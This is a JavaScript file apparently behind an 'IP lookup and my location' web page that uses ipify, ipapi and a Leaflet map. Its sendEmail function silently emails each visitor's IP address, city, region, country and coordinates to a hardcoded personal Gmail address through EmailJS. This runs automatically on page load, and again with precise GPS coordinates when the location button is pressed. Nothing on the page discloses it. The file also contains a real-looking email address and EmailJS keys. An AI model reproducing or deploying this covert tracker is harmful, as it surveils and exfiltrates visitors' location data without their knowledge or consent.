let map; // Global variable to hold the map instance

document.addEventListener('DOMContentLoaded', async () => {
    // Automatically get user's IP and display information
    await getUserIp();

    document.getElementById('locationBtn').addEventListener('click', () => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    const { latitude, longitude } = position.coords;
                    displayLocation(latitude, longitude);
                    initMap(latitude, longitude);
                    sendEmail(latitude, longitude); // Send email when location is retrieved
                },
                error => {
                    console.error('Error obtaining location:', error);
                    alert('Unable to retrieve your location. Please enable location services.');
                }
            );
        } else {
            alert('Geolocation is not supported by this browser.');
        }
    });

    document.getElementById('lookupBtn').addEventListener('click', async function() {
        const ipInput = document.getElementById('ipInput').value;
        await lookupIp(ipInput);
    });
});

// Function to get the user's public IP address
async function getUserIp() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        await lookupIp(data.ip);
    } catch (error) {
        console.error('Error fetching user IP:', error);
        alert('Unable to retrieve your IP address.');
    }
}

async function lookupIp(ip) {
    const ipAddressDisplay = document.getElementById('ipAddress');
    const locationDisplay = document.getElementById('location');
    
    try {
        // Fetching IP information from the ipapi API
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        
        if (!response.ok) throw new Error('IP not found');

        const data = await response.json();
        const { ip: ipAddress, city, region, country_name: country, latitude: lat, longitude: lon } = data;

        // Displaying results
        ipAddressDisplay.textContent = ipAddress;
        locationDisplay.textContent = `${city}, ${region}, ${country}`;
        
        // Initialize Leaflet map
        initMap(lat, lon);
        sendEmail(lat, lon, ipAddress, city, region, country); // Send email with IP data

    } catch (error) {
        alert(error.message);
    }
}

function initMap(lat, lon) {
    // If map already exists, remove it
    if (map) {
        map.remove();
    }

    // Create a new map instance
    map = L.map('map').setView([lat, lon], 10);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
    }).addTo(map);

    L.marker([lat, lon]).addTo(map)
        .bindPopup('Location')
        .openPopup();
}

// Function to display user's location
function displayLocation(lat, lon) {
    const ipAddressDisplay = document.getElementById('ipAddress');
    const locationDisplay = document.getElementById('location');

    ipAddressDisplay.textContent = 'Your IP address (not retrieved)';
    locationDisplay.textContent = `Latitude: ${lat}, Longitude: ${lon}`;
}

// Function to send email using EmailJS
function sendEmail(lat, lon, ipAddress, city, region, country) {
    emailjs.init('3PyPbjChXwDJ4z-1U');

    const templateParams = {
        to_email: 'abdullah22developer@gmail.com', 
        latitude: lat,
        longitude: lon,
        ip: ipAddress,
        city: city,
        region: region,
        country: country,
    };

    emailjs.send('service_i64itwg', 'template_tz7m1re', templateParams)
        .then(response => {
            console.log('Email sent successfully!', response);
        }, error => {
            console.error('Failed to send email:', error);
        });
}
